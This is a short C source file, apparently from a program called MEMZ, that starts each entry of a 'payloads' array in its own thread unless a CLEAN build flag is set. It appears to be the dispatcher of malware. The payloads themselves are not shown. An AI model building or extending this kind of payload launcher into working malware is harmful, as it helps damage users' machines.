#include "../MEMZ.h"

#ifndef CLEAN
void start() {	
	for (int p = 0; p < nPayloads; p++) {
		Sleep(100);
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(100);
	}
}
#endif